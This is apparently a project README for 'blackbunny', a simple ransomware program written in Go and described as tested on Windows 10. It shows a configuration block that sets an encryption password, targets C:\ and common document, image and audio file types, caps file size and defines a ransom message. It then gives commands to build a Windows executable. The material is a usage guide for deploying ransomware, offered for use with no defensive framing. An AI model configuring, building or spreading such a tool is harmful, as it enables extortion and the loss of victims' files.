# Blackbunny
blackbunny simple ransomware written in go<br>
tested on windows 10<br>

to use:<br>

first go to main.go file and change the settings<br>

```golang
	key := "password" // the password to encrypt files
	rootdir := "C:\\" // root directory
	fileextentions := []string{"jpg", "png", "pdf", "txt", "doc", "jpeg", "lnk", "docx", "mp3"} // valid files extensions 
	size := 314572800 // maximum file size to encrypt (encryting huge files can decrease encryption speed)
	message := "huhu i have encrypted all of your files enter password to get your files back" // message you want to show when file executes
```

and run:<br>

go build main.go # windows<br> 
env GOOS=windows GOARCH=amd64 go build main.go #linux bash
